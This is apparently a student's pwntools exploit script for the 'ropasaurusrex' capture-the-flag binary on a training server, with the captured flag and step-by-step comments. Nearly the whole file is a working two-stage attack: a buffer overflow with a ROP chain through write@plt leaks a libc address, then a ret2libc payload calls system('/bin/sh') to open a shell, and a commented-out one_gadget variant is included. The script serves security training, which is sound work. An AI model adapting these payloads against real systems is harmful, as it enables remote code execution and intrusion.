from pwn import *
import time

binary = ELF("./ropasaurusrex")
libc = ELF("./libc-2.27.so")

r = remote("bin.training.jinblack.it", 2014)

#libc = ELF("/lib/i386-linux-gnu/libc.so.6")
#r = process("./ropasaurusrex")

#gdb.attach(r, '''
#b *0x0804841d
#''') 
#b *0x08048416


#flag{roar_rop_wierd_machines_are_lovely_like_a_trex!}

#little recap from the pwn library that we imported
#*.got[name]: from name to address, for all Global Offset Table (GOT) entries
#*.plt[name]: from name to address, for all Procedure Linkate Table (PLT) entries
#*.entry: address of the entry point for the ELF
#*.symbols[name]: from name to address, for all symbols in the ELF


#got symbol of the write
what_to_write = binary.got["write"]
#plt symbol of the write
where_to_jump = binary.plt["write"]

#since we don't have enough information to call the system function, the goal of the exploit is to leak its address in order to spawn a shell.
#In order to do this, we leak the address of another function in the libc (write), with the goal of getting the base address of the libc,
#retrieving then the system function's address.

#we leak the address of the write function exploiting a buffer overflow and, through a jump into the PLT and utilizing the write function, we are able
#to print to stdout the libc address of write.

#it is a multistage exploit, since with the first payload we retrieve the address of the write function in the libc, returning then back to 
#the start of the program, putting binary.entry as return address.
#then, through the second payload, we reach to call the system function, having already leaked the address of the libc.

#filling the buffer
payload = b"a" * 136
payload += b"bbbb"              #EBP
payload += p32(where_to_jump)   #EIP, we want to jump into the PLT table
payload += p32(binary.entry)    #return address, restart the main after the write

#the write function requires 3 parameters: fd, *buf, count
payload += p32(1)               #fd is stdout -> p32(0) or p32(1)
payload += p32(what_to_write)   #buf is the GOT table, since I want to write from there
payload += p32(4)               #count is 4, since 4 bytes are enough to be printed out



#input("press a key to leak the libc base address...")
time.sleep(0.5)
r.sendline(payload)


#my exploit needs to be multistage, so I restart the program (the main function), but having a leak!

#leaking in remote the address in memory of the "write" function
leak = u32(r.recv(4))

write_offset = libc.symbols["write"]
libc_base = leak - write_offset

print("LIBC base: " + hex(libc_base))



#EXPLOIT WITH SYSTEM

#retrieving the reference to the /bin/sh string
bin_sh_offset = next(libc.search(b"/bin/sh"))
#retrieving the offset of the system in the libc
system_offset = libc.symbols["system"]

payload = b"a"*136                          #filling the buffer
payload += b"bbbb"                          #EBP
payload += p32(libc_base + system_offset)   #EIP
payload += b"cccc"                          #return address (we don't need it)
payload += p32(libc_base + bin_sh_offset)   #parameter
r.send(payload)



# EXPLOIT WITH GADGETS

#seeing with one_gadget command, we want:
#   the GOT address of the libc, in the EBP
#   a pointer to NULL, in the ESP

#payload = b"a"*136                          #filling the buffer
#payload += p32(libc_base + 0x1eb000)        #EBP, adding the offset of got.plt, found with "readelf -a" of the library, to the libc base
#payload += p32(libc_base + 0x1487fc)        #EIP, we want to jump to the address of the gadget we have chosen
#payload += b"\x00\x00\x00\x00"              #after jumping in the gadget, the ESP will point to here! So I make it point to NULL



r.interactive()